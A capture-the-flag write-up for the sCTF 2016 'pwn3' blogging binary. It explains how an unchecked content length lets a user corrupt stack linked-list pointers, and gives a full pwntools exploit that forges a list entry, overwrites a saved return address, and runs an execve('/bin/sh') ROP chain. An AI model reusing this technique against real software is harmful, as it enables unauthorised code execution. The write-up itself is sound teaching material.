### Solved by Swappage & Superkojiman

# analysis

pwn3 was a binary *blogging application* for linux x86

    pwn3: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=4838e54f549c6c8d9e49fc91153fe41060dbfbe5, not stripped

when running the application provided the following options to the user

    +-------------------------------------------+
    | Welcome to the Universal Blogging Engine, |
    | your one-stop-shop for all blogging needs.|
    +-------------------------------------------+
    +--------------------+
    |       Options      |
    | [1] Write a post   |
    | [2] Edit a post    |
    | [3] List all posts |
    | [4] Print a post   |
    | [5] Quit           |
    +--------------------+

i started fuzzing a bit with the application and here is what i figured out by simply adding 2 threads

    1
    Your name: AAAA
    Title: BBBB
    Contents: CCCCDDDDEEEEFFFF
    Thread successfully added!
    +--------------------+
    |       Options      |
    | [1] Write a post   |
    | [2] Edit a post    |
    | [3] List all posts |
    | [4] Print a post   |
    | [5] Quit           |
    +--------------------+
    1
    Your name: aaaa
    Title: bbbb
    Contents: cccc
    Thread successfully added!
    +--------------------+

For every entry we add, a new element is placed on the stack

    gdb-peda$ find AAAA stack
    Searching for 'AAAA' in: stack ranges
    Found 1 results, display max 1 items:
    [stack] : 0xffff42a9 ("AAAA")
    gdb-peda$ x/128wx 0xffff42a9
    0xffff42a9:	0x41414141	0x00000000	0x00000000	0x00000000
    0xffff42b9:	0x00000000	0x00000000	0x00000000	0x00000000
    0xffff42c9:	0x42424242	0x00000000	0x00000000	0x00000000
    0xffff42d9:	0x00000000	0x00000000	0x00000000	0x00000000
    0xffff42e9:	0x00000000	0x00000000	0x00000000	0x00000000
    0xffff42f9:	0x00000000	0x00000000	0x00000000	0x00000000
    0xffff4309:	0x43434343	0x44444444	0x45454545	0x46464646
    0xffff4319:	0x00000000	0xffff438a	0x61616101	0x00000061
    0xffff4329:	0x00000000	0x00000000	0x00000000	0x00000000
    0xffff4339:	0x00000000	0x00000000	0x62626200	0x00000062
    0xffff4349:	0x00000000	0x00000000	0x00000000	0x00000000
    0xffff4359:	0x00000000	0x00000000	0x00000000	0x00000000

and by looking at it, it really looks like they are a linked list, where every element has a pointer to the next.

using the 3rd function confirmed it

    3
    ID      : 0
    Poster  : AAAA
    Title   : BBBB
    Contents: CCCCDDDDEEEEFFFF
    Next    : 0xffff431d

    ID      : 1
    Poster  : aaaa
    Title   : bbbb
    Contents: cccc
    Next    : 0xffff438a

funny things start to happen when we use the second function:
in fact every element on the list is placed at a fixed distance of 4 bytes from the previous one, and there is no boundary check in the length of the content; this can result in the corruption of arbitrary list elements, as we can see from the following application output.

    3
    ID      : 0
    Poster  : AAAA
    Title   : BBBB
    Contents: CCCCDDDDEEEEFFFF
    Next    : 0xffff431d

    ID      : 1
    Poster  : aaaa
    Title   : bbbb
    Contents: cccc
    Next    : 0xffff438a

    ID      : 70
    Poster  : FFF
    Title   :
    Contents:
    Next    : 0x45454545

Assuming we are dealing with a vanilla linked list, at this point we know that we can use the following procedure
- add a first element to the list
- add a second element to the list
- edit the first to overflow in the second

to tamper with the next element pointer of the second element.
The next natural step for me was to try adding a new element, as this would eventually write garbage data to an arbitrary memory location, but something didn't go as expected

I noticed that if i tampered with a pointer of a list element, and then tried to append a new item at the end of the list, the item wouldn't display if i tried to list all the elements in the list, even if it was added on the stack; further examination revealed, that other variables were present on the stack, and one of those was used as a fixed pointer to the list tail, and was only updated by the append_thread function.

    0x08049093    83c069         add eax, 0x69
    0x08049096    8d1403         lea edx, dword [ebx + eax]
    0x08049099    8b4508         mov eax, dword [ebp + 8]       ; [0x8:4]=0
    0x0804909c    8910           mov dword [eax], edx
    0x0804909e    c70424edeb0b.  mov dword [esp], str.Thread_successfully_added_  ;

The following values on the stack respectively represent

    gdb-peda$ x/4wx 0xffff428c-8
    0xffff4284:	0xffff4396	0x00000000	0x00000003	0x00000002

- the pointer to the location in memory where the new item would be added
- the id of the last edited thread (0 also means none).
- the last option chosen in the menu (scanf saves its data here)
- the total number of threads in the list.

This added some complexity to the exploitation process, because it revealed that it's not enough to tamper with the list pointers and append a new thread, but a series of constraint must be respected for the application to behave as expected.

but let's take a step back.

A list element is structured as follows:

- 4 bytes that represent the pointer to the next element in the list
- 1 byte that represents the element id (in python chr(byte))
- 32 bytes are allocated for the Poster
- 64 bytes are reserved for the title
- a variable amount of bytes is dynamically allocated for the thread boundary

upon creation
- the item is placed on the stack
- 4 is added to the value of the last byte in the comment and the result is used to determine the pointer to the next element in the list.
- the value is used both as a property of the list item itself, as well as for updating the variable keeping track of the list tail.

upon edit
- if the element to be edited is not the last in the list, then the list is traversed till the desired item is reached
- the id is used to identify the item to edit.

upon listing
- the list is traversed and an element is read until a null pointer is found, which determines the endo of the list.


# exploitation

Now that we know enough about the application behavior, we can start thinking about the exploit.

The theory behind it is still the same: tamper the list pointers to obtain an arbitrary write what where condition, but for this to work the process is a bit more complicated then what I initially imagined.

We can't append a new item, the only way to overwrite arbitrary memory locations is to use the edit function, also by doing this, we need to make sure that the structure of the list is preserved in terms of order, and that the id of the item we are going to edit is lower then the total amount of threads the application knows to exist.

to accomplish this i decided to proceed as follows:
- added 15 items to the list
- edited the 6th element in the list to modify the pointer from 7th item to 8th item.
- carefully picked an area of memory as a destination that would result in a valid item: the pointer to the next element wasn't null and the id would be 8
- at this point i had an 8th element which would be recognized as valid by the application
- edited it to tamper with the memory location where the saved return address from menu() to main() was stored.

returning from menu() to main() by quitting the application would allow us to control EIP.

Superkojiman jumped in here and built a rop chain, added it to the exploit and captured the flag.

here is our exploit code

```python
#!/usr/bin/python

from pwn import *

context(arch = 'i386', os = 'linux')

#r = remote("localhost", 2323)
r = remote("problems2.2016q1.sctf.io", 1339)

print r.recvuntil("|\n+--------------------+\n")

#add some elements to the list
for a in range(0, 15):
    r.send("1\n")
    print r.recv()
    r.send("AAAA\n")
    print r.recv()
    r.send ("BBBB\n")
    print r.recv()
    r.send("CCCCDDDDE/bin/sh\n")
    print r.recvuntil("|\n+--------------------+\n")

#leak valid stack address
# this returns the pointer that item 0 has for item 1
# can be used as a reference to defeat aslr but also for other things (maybe)
r.send("3\n")
output = r.recv()
print output

stack1 = output.split("Next    : ")[1].split("\n")[0]
stack1 = int(stack1, 16) # this is the pointer stored in the element 0 of list pointing to element 1

main = stack1 + 0x910f
binsh = stack1 - 0xB

print "stack address: " + hex(stack1)
print "return to main at: " + hex(main)
print "our buffer will go at: " + hex(main-100+16-4)
print "/bin/sh string: " + hex(binsh)

# here we edit the 6th entry in the list to tamper the 7th next element pointer
#buffer
buffer = ""
buffer += "A"*20         # junk
buffer += p32(main-100+16-4)        # pointer to next entry
buffer += chr(7)         # element id (we modify the second by doing so we forge a 3rd non registered element)
buffer += "A"*16         # the list body of the next element we forge
buffer += "\n"

r.send("2\n")
print r.recv()
r.send("6\n")
print r.recv()
r.send(buffer)
print r.recvuntil("|\n+--------------------+\n")

# now that we have tampered the pointer from 7th element to 8th element
# we can use the edit function as an arbitrary write what where and control RIP


read_flag = p32(0x080ea001)

buffer = ""
buffer += "A"*19
#buffer += p32(0x42424242)  # here we control rip

# sys execve("/bin/sh", 0, 0)
buffer += p32(0x8054f10)    # xor eax eax ;;
buffer += p32(0x8096372)    # add eax 0xb ; pop edi ;;
buffer += "JUNK"            # pops into edi
buffer += p32(0x806f511)    # pop ecx ; pop ebx ;;
buffer += p32(0xffffffff)   # ecx, needs to be 0
buffer += p32(binsh)        # ptr "/bin/sh"
buffer += p32(0x806f4ea)    # pop edx
buffer += p32(0xffffffff)   # edx, needs to be 0
buffer += p32(0x80daf8c)    # inc ecx ;;
buffer += p32(0x805dd27)    # inc edx ;;
buffer += p32(0x806fbc0)    # int 0x80 ;;

buffer += "\n"

r.send("2\n")
print r.recv()
r.send("8\n")
print r.recv()
r.send(buffer)
print r.recvuntil("|\n+--------------------+\n")


# now we return from menu to main and libc_start to quit returning into our buffer
r.send("5\n")

r.interactive()


```
